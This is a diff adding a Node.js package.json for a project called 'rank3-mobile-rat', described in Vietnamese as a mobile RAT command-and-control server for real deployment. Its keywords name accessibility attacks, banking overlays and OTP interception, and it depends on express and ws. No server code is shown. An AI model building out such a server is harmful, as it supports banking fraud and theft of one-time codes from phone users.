@@ -1,0 +1,23 @@
+{
+  "name": "rank3-mobile-rat",
+  "version": "2.0.0",
+  "description": "Rank 3: Mobile RAT C2 Server — Triển khai thật",
+  "main": "server.js",
+  "scripts": {
+    "start": "node server.js",
+    "dev": "node server.js"
+  },
+  "keywords": [
+    "mobile-rat",
+    "accessibility-attack",
+    "banking-overlay",
+    "otp-interceptor",
+    "security-research"
+  ],
+  "author": "",
+  "license": "ISC",
+  "dependencies": {
+    "express": "^4.18.2",
+    "ws": "^8.13.0"
+  }
+}
